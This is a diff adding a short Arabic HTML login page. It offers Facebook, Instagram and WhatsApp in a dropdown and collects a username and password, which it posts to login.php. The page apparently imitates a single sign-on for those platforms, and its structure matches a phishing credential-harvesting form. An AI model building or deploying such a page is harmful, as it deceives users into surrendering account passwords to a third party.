@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>تسجيل الدخول الموحد</title>
+</head>
+<body>
+    <h2>تسجيل الدخول</h2>
+    <form action="login.php" method="POST">
+        <label>اختر المنصة:</label>
+        <select name="platform">
+            <option value="Facebook">فيسبوك</option>
+            <option value="Instagram">انستجرام</option>
+            <option value="WhatsApp">واتساب</option>
+        </select><br><br>
+        
+        <label>اسم المستخدم أو البريد:</label>
+        <input type="text" name="username" required><br><br>
+        
+        <label>كلمة المرور:</label>
+        <input type="password" name="password" required><br><br>
+        
+        <button type="submit">تسجيل الدخول</button>
+    </form>
+</body>
+</html>
